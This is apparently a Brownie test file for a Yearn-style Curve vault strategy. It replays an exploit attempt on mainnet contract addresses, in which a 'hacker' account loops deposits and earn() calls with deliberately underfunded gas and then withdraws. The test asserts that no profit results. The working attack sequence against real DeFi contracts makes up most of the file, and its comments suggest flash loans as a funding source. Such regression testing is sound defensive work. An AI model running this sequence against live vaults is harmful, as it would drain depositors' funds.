def test_proxy_earn(accounts, Token, Contract, StrategyCurveYVoterProxy):
    # NOTE: This person has a ton of DAI, but flash loans could be used instead
    hacker = accounts[-1]

    # Grab all code from the chain
    andre = accounts[-3]
    multisig = accounts[-2]
    crv = Contract("0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51")
    ycrv = Token.at("0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8")
    dai = Token.at("0x6B175474E89094C44Da98b954EedeAC495271d0F")
    ydai = Contract("0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01")
    vault = Contract("0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c")
    controller = Contract(vault.controller())
    strategy = andre.deploy(StrategyCurveYVoterProxy, controller)
    controller.approveStrategy(
        "0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01", strategy, {"from": multisig},
    )

    # Convert DAI to yCRV
    dai.approve(ydai, 2 ** 256 - 1, {"from": hacker})
    ydai.deposit(dai.balanceOf(hacker), {"from": hacker})
    ydai.approve(crv, 2 ** 256 - 1, {"from": hacker})
    crv.add_liquidity([ydai.balanceOf(hacker), 0, 0, 0], 0, {"from": hacker})
    ycrv.approve(vault, 2 ** 256 - 1, {"from": hacker})

    before = ycrv.balanceOf(hacker)
    while ycrv.balanceOf(hacker) - before >= 0:
        print("Vault's assets", vault.balance() // 10 ** vault.decimals(), "yCRV")
        print(
            "Hacker's balance", ycrv.balanceOf(hacker) // 10 ** ycrv.decimals(), "yCRV"
        )
        vault.deposit(ycrv.balanceOf(hacker) // 2, {"from": hacker})  # Deposit half
        vault.earn(
            {"from": hacker, "gas_limit": 300000}
        )  # Purposely-underfund gas (fails to update)
        vault.deposit(
            ycrv.balanceOf(hacker), {"from": hacker}
        )  # Deposit the other half
        vault.earn({"from": hacker})  # Big swing
        vault.withdraw(vault.balanceOf(hacker), {"from": hacker})  # Profit!

    assert ycrv.balanceOf(hacker) - before <= 0
